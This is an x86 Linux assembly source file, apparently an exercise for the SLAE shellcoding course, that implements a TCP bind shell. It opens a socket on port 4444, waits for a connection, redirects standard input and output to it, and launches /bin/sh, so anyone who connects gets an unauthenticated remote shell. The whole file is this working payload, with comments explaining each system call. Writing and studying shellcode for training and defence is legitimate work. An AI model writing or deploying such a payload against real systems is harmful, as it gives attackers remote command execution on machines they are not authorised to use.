; Filename: bind_shell_tcp.nasm
; Author:  Bohan Zhang
; Website:  https://bohansec.com
; SLAE-ID: 1562
;
;
; Purpose: bind a port and listening incoming connection, then execute the /bin/sh when there is incoming connection

global _start			

section .text

_start:

	;init the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	;create a socket
	mov ax, 359 ;call the socket
	mov bl, 2 ;set domain to 2
	mov cl, 1 ; set type to 1
	int 0x80

	;bind the socket
	xor ebx, ebx ;clear ebx
	mov ebx, eax ;ebx stores sockfd
	mov ax, 361 ;call bind
	push esi ;any ip address
	push word 0x5c11 ;port 4444
	push word 0x2	;sin family
	mov ecx, esp	;let ecx points to the start of the stack
	mov dl, 0x10	;addess length is 16
	int 0x80

	;listen
	mov ax, 363 ;call listen
	xor ecx, ecx ;backlog is 0, sockfd is in ebx
	int 0x80

	;accept
	mov ax, 364; sockfd is in ebx, sockaddr is in ecx, socklen_t is in edx
	int 0x80

	;dup2, essentially it gives us ability to enter command and see output in our shell
	mov ebx, eax ;get the oldfd
	mov cl, 3 ;the newfd, stdin, stdout, std error
dup2:
	xor eax,eax ;reset the eax
	mov al, 63 ;call dup2
	int 0x80
	dec ecx
	jns dup2
	
	;execve
	
	xor eax, eax
	push eax ;set envp to 0
	push 0x68732f2f;'//bin/sh'
	push 0x6e69622f
	mov ebx, esp ;ebx points to pathname
	push eax	;push another 0 on the stack
	mov edx, esp	;edx points to envp
	push ebx
	mov ecx, esp	;ecx points to argv
	mov al, 11
	int 0x80
	
	


